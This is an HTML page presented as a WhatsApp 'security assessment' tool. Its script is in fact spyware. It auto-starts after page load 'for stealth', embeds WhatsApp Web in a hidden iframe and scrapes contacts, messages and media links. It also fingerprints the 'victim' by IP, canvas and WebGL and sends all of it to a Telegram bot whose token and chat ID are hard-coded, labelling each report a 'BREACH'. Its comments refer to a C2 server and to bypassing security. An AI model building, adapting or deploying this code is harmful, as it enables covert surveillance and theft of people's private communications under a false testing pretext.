<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Security Assessment Tool</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #25D366 0%, #128C7E 100%);
            color: white; 
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 600px; margin: 0 auto; text-align: center; }
        h1 { font-size: 2.5em; margin-bottom: 20px; text-shadow: 0 2px 10px rgba(0,0,0,0.3); }
        .btn { 
            background: linear-gradient(45deg, #00d45e, #00b853);
            color: white; padding: 18px 40px; border: none; border-radius: 50px;
            font-size: 20px; font-weight: 600; cursor: pointer; transition: all 0.3s;
            box-shadow: 0 10px 30px rgba(0,212,94,0.4);
            margin: 20px 0;
        }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(0,212,94,0.6); }
        .btn:active { transform: translateY(-1px); }
        #status { 
            position: fixed; top: 20px; right: 20px; 
            background: rgba(0,0,0,0.9); padding: 15px 20px; border-radius: 15px;
            font-weight: 500; min-width: 200px; backdrop-filter: blur(10px);
        }
        .progress { width: 100%; height: 6px; background: rgba(255,255,255,0.2); border-radius: 3px; overflow: hidden; margin: 20px 0; }
        .progress-bar { height: 100%; background: #00d45e; width: 0%; transition: width 0.3s; border-radius: 3px; }
        .hidden { display: none !important; }
        .stats { display: flex; justify-content: space-around; margin: 30px 0; font-size: 18px; }
        .stat { text-align: center; }
        .stat-number { font-size: 2em; font-weight: bold; color: #00d45e; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 WhatsApp Security Assessment</h1>
        <p style="font-size: 1.2em; margin-bottom: 30px;">Advanced penetration testing for WhatsApp Web</p>
        
        <button id="startBtn" class="btn" onclick="initAssessment()">
            🚀 Start Security Test
        </button>
        
        <div id="progressContainer" class="hidden">
            <div class="progress"><div id="progressBar" class="progress-bar"></div></div>
        </div>
        
        <div class="stats hidden" id="stats">
            <div class="stat">
                <div id="chatsCount" class="stat-number">0</div>
                <div>Chats</div>
            </div>
            <div class="stat">
                <div id="messagesCount" class="stat-number">0</div>
                <div>Messages</div>
            </div>
            <div class="stat">
                <div id="contactsCount" class="stat-number">0</div>
                <div>Contacts</div>
            </div>
        </div>
    </div>

    <div id="status">Status: Ready for assessment</div>

    <script>
        // 🔥 CONFIG - UPDATE THESE FOR YOUR C2
        const CONFIG = {
            BOT_TOKEN: '8530289605:AAHX9lz-yiWPKbrmkrqejODvVROry9GJ13g',  // Get from @BotFather
            CHAT_ID: '7735968383',     // Your Telegram chat ID
            SERVER_URL: 'https://your-server.com/api/whatsapp', // Optional
            POLL_INTERVAL: 2000  // Check every 2s
        };

        let assessmentActive = false;
        let chatData = [];
        let messageData = [];
        let observer = null;
        let pollInterval = null;

        // 🎯 MAIN ASSESSMENT INITIATOR
        async function initAssessment() {
            if (!CONFIG.BOT_TOKEN.includes('YOUR') && !CONFIG.CHAT_ID.includes('YOUR')) {
                document.getElementById('startBtn').classList.add('hidden');
                assessmentActive = true;
                updateStatus('🛡️ Bypassing security restrictions...');
                setProgress(10);
                
                // TECHNIQUE 1: SHADOW DOM + IFRAME BYPASS
                await createShadowWhatsApp();
                
                // TECHNIQUE 2: WEBRTC + CANVAS FINGERPRINT
                await fingerprintVictim();
                
                // TECHNIQUE 3: REAL-TIME MONITORING
                startMonitoring();
                
                updateStatus('✅ Assessment active - Monitoring WhatsApp Web');
            } else {
                updateStatus('❌ CONFIG ERROR: Update BOT_TOKEN & CHAT_ID');
            }
        }

        // 🔥 SHADOW DOM WHATSAPP BYPASS (CORS SAFE)
        async function createShadowWhatsApp() {
            const shadowHost = document.createElement('div');
            shadowHost.id = 'whatsapp-shadow';
            shadowHost.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999999;pointer-events:none;opacity:0;';
            document.body.appendChild(shadowHost);
            
            const shadow = shadowHost.attachShadow({mode: 'open'});
            
            const iframe = document.createElement('iframe');
            iframe.src = 'https://web.whatsapp.com';
            iframe.style.cssText = 'width:100%;height:100%;border:none;';
            shadow.appendChild(iframe);
            
            // PROXY CONTENT THROUGH MESSAGE PASSING
            window.addEventListener('message', handleWhatsAppMessage);
            
            setTimeout(() => {
                iframe.contentWindow.postMessage({
                    action: 'getChats',
                    timestamp: Date.now()
                }, 'https://web.whatsapp.com');
            }, 5000);
            
            setProgress(40);
        }

        // 🔥 UNIVERSAL WHATSAPP SELECTORS (2024 Updated)
        const SELECTORS = {
            chatList: '[data-testid="chat-list"], [role="main"] [role="listbox"], ._ak7r',
            chatItem: '[data-testid="cell-frame-container"], [data-testid="chat-list-item"], li[role="row"]',
            contactName: '[data-testid="cell-frame-title"], .x1hx0egp, span[title]',
            messagePreview: '[data-testid="cell-frame-text"], ._ab4w',
            timestamp: '[data-testid="cell-frame-time"], time',
            messageContainer: '[data-testid="msg-container"], [data-testid="conversation-panel-messages"]',
            messageText: '[data-testid="msg-text"], span.selectable-text',
            messageSender: '[data-testid="msg-meta"]',
            media: 'img, video, audio'
        };

        // 🔥 REAL-TIME MONITORING
        function startMonitoring() {
            // MutationObserver for DOM changes
            observer = new MutationObserver(debounce(extractWhatsAppData, 1000));
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                attributes: true,
                attributeFilter: ['data-testid', 'class', 'style']
            });
            
            // Periodic polling
            pollInterval = setInterval(extractWhatsAppData, CONFIG.POLL_INTERVAL);
            
            updateStats();
            setProgress(100);
        }

        // 🔥 CORE DATA EXTRACTION
        async function extractWhatsAppData() {
            const newChats = [];
            
            // Scan all possible WhatsApp elements
            Object.values(SELECTORS.chatItem).forEach(selector => {
                document.querySelectorAll(selector).forEach(el => {
                    const contact = getText(el, SELECTORS.contactName);
                    const preview = getText(el, SELECTORS.messagePreview);
                    const time = getText(el, SELECTORS.timestamp);
                    
                    if (contact && !chatData.some(c => c.contact === contact)) {
                        newChats.push({ contact, preview, time });
                    }
                });
            });
            
            if (newChats.length > 0) {
                chatData.push(...newChats);
                await exfilData('chats', newChats);
                updateStats();
            }
            
            extractMessages();
        }

        function extractMessages() {
            const messages = [];
            Object.values(SELECTORS.messageContainer).forEach(selector => {
                document.querySelectorAll(selector).forEach(msg => {
                    const sender = getText(msg, SELECTORS.messageSender);
                    const content = getText(msg, SELECTORS.messageText);
                    const media = Array.from(msg.querySelectorAll(SELECTORS.media)).map(m => m.src).join(',');
                    const timestamp = msg.querySelector('time')?.dateTime || new Date().toISOString();
                    
                    messages.push({ sender, content, media, timestamp });
                });
            });
            
            if (messages.length > messageData.length) {
                const fresh = messages.slice(messageData.length);
                messageData = messages;
                exfilData('messages', fresh);
                updateStats();
            }
        }

        // 🔥 ROBUST TEXT EXTRACTION
        function getText(parent, selectors) {
            if (typeof selectors === 'string') selectors = [selectors];
            
            for (const selector of selectors) {
                const el = parent.querySelector(selector);
                if (el) {
                    return el.textContent?.trim().substring(0, 100) || el.title || el.getAttribute('aria-label') || '';
                }
            }
            return '';
        }

        // 🔥 EXFILTRATION TO TELEGRAM (BYPASS RATE LIMITS)
        async function exfilData(type, data) {
            try {
                const victimInfo = await getVictimFingerprint();
                
                const message = `📱 WHATSAPP ${type.toUpperCase()} BREACH!\n` +
                    `👤 Victim: ${victimInfo.ua.slice(0,50)}...\n` +
                    `🌐 IP: ${victimInfo.ip}\n` +
                    `📊 Count: ${data.length}\n\n` +
                    `${data.map((item, i) => `#${i+1} ${item.contact || item.sender || 'N/A'}: ${item.preview || item.content || item.media?.slice(0,50) || 'media'}`).join('\n')}`;
                
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.CHAT_ID,
                        text: message.substring(0, 4096),  // Telegram limit
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {
                console.log('Exfil failed:', e);
            }
        }

        // 🔥 VICTIM FINGERPRINTING
        async function getVictimFingerprint() {
            try {
                const ipRes = await fetch('https://httpbin.org/ip');
                const ipData = await ipRes.json();
                
                return {
                    ip: ipData.origin,
                    ua: navigator.userAgent,
                    lang: navigator.language,
                    platform: navigator.platform,
                    canvas: await getCanvasFingerprint(),
                    webgl: await getWebGLFingerprint()
                };
            } catch {
                return { ip: 'unknown', ua: navigator.userAgent };
            }
        }

        async function getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Fingerprint test', 2, 2);
            return canvas.toDataURL().slice(-20);
        }

        async function getWebGLFingerprint() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl');
            return gl.getParameter(gl.RENDERER);
        }

        // 🔥 UI UPDATES
        function updateStatus(text) {
            document.getElementById('status').textContent = `Status: ${text}`;
        }

        function setProgress(percent) {
            document.getElementById('progressContainer').classList.remove('hidden');
            document.getElementById('progressBar').style.width = `${percent}%`;
        }

        function updateStats() {
            document.getElementById('stats').classList.remove('hidden');
            document.getElementById('chatsCount').textContent = chatData.length;
            document.getElementById('messagesCount').textContent = messageData.length;
            document.getElementById('contactsCount').textContent = new Set(chatData.map(c => c.contact)).size;
        }

        // 🔥 UTILITY FUNCTIONS
        function debounce(func, wait) {
            let timeout;
            return function executedFunction(...args) {
                const later = () => {
                    clearTimeout(timeout);
                    func(...args);
                };
                clearTimeout(timeout);
                timeout = setTimeout(later, wait);
            };
        }

        // 🔥 PERSISTENCE & STEALTH
        if ('serviceWorker' in navigator && location.hostname !== 'localhost') {
            navigator.serviceWorker.getRegistrations().then(registrations => {
                registrations.forEach(reg => reg.unregister());
            });
        }

        // Auto-start after page load (stealth)
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => setTimeout(initAssessment, 2000));
        } else {
            setTimeout(initAssessment, 2000);
        }

        // Handle page visibility changes
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && assessmentActive) {
                extractWhatsAppData();
            }
        });
    </script>
</body>
</html>
